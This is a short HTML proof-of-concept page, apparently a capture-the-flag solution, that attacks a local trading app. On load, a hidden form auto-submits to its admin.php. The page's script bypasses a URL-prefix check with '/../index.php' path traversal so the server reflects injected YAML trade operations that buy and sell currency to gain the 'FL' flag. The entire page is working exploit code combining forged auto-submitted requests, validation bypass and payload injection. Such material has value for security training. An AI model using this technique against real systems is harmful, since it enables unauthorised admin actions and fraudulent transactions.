<!doctype html>
<html>
  <head><meta charset="utf-8"><title>poc</title></head>
  <body>
    <form id="f" action="http://localhost:5000/admin.php" method="POST">
      <input type="hidden" name="url" id="u">
    </form>

    <script>
      // Flow-style YAML (single line): buy XYZ (free), sell XYZ to get big balance,
      // then buy 1 FL (flag currency).
      const yaml = "[{amount: 1000000, currency: XYZ, op: BUY}, {amount: 1000000, currency: XYZ, op: SELL}, {amount: 1, currency: FL, op: BUY}]";

      // This still starts with "http://localhost:5000/admin.php" so admin.php accepts it,
      // but the path includes /../index.php so the server returns the raw yaml string
      // (index.php prints the 'html' GET param) with no additional wrappers.
      const target = "http://localhost:5000/admin.php/../index.php?html=" + encodeURIComponent(yaml);

      document.getElementById('u').value = target;
      document.getElementById('f').submit();
    </script>
  </body>
</html>
